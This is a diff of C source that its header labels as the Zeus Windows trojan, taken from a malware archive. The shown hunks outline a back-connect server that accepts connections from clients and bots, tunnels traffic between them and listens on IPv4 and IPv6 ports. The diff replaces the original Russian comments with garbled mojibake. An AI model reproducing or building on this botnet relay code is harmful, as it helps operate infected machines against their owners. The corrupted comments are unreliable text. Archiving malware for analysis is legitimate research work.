@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ws2tcpip.h>
 
@@ -43,7 +54,7 @@ static DWORD bccListCount;
 static CRITICAL_SECTION csBccConnect;
 
 /*
-  Создание ресурсов для контнроля списка соединений.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void initBccConnect(void)
 {
@@ -54,7 +65,7 @@ static void initBccConnect(void)
 }
 
 /*
-  Освобождения ресурсов для контнроля списка соединений.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void uninitBccConnect(void)
 {
@@ -62,11 +73,11 @@ static void uninitBccConnect(void)
 }
 
 /*
-  Поиск данных соединения.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN id - ID соединения.
+  IN id - ID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return - данные соединения, или NULL - если оно не найдено.
+  Return - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ NULL - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static BCCCONNECT *getBccConnect(DWORD id)
 {
@@ -75,11 +86,11 @@ static BCCCONNECT *getBccConnect(DWORD id)
 }
 
 /*
-  Добавление нового соединения в список.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN client - сокет для добавления.
+  IN client - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return    - ID соединения, или 0 - в случаи ошибки.
+  Return    - ID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ 0 - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static DWORD addBccConnect(SOCKET client)
 {
@@ -126,9 +137,9 @@ static DWORD addBccConnect(SOCKET client)
 }
 
 /*
-  Закрытие соединение и освобождение всех ресурсов.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  IN id - ID соединения.
+  IN id - ID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void closeBccConnect(DWORD id)
 {
@@ -169,9 +180,9 @@ static void closeBccConnect(DWORD id)
 }
 
 /*
-  Тунель между клиентом и ботом
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 
-  IN p   - DWORD, ID соединения.
+  IN p   - DWORD, ID пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - 0.
 */
@@ -225,9 +236,9 @@ static DWORD WINAPI sockTunnel(void *p)
 }
 
 /*
-  Прием соединений от клиентов и ботов.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN gsd - данные сокетов.
+  IN gsd - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void __inline acceptGeneralConnections(const GENSOCKDATA *gsd)
 {
@@ -368,7 +379,7 @@ NEXT:;
 }
 
 /*
-  Кэлбэк консоли, для остановки процесса.
+  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
   Return - TRUE.
 */
@@ -379,11 +390,11 @@ static BOOL WINAPI handlerRoutine(DWORD)
 }
 
 /*
-  Создание листинга на IPv4.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ IPv4.
 
-  IN port - порт.
+  IN port - пїЅпїЅпїЅпїЅ.
 
-  Return  - хэндл сокета, или INVALID_SOCKET.
+  Return  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ INVALID_SOCKET.
 */
 static SOCKET listenPortIpv4(WORD port)
 {
@@ -397,11 +408,11 @@ static SOCKET listenPortIpv4(WORD port)
 }
 
 /*
-  Создание листинга на IPv6.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ IPv6.
 
-  IN port - порт.
+  IN port - пїЅпїЅпїЅпїЅ.
 
-  Return  - хэндл сокета, или INVALID_SOCKET.
+  Return  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ INVALID_SOCKET.
 */
 static SOCKET listenPortIpv6(WORD port)
 {
@@ -415,7 +426,7 @@ static SOCKET listenPortIpv6(WORD port)
 }
 
 /*
-  Точка входа.
+  пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 */
 void commandListen(LPWSTR *switches, DWORD switchesCount)
 {  
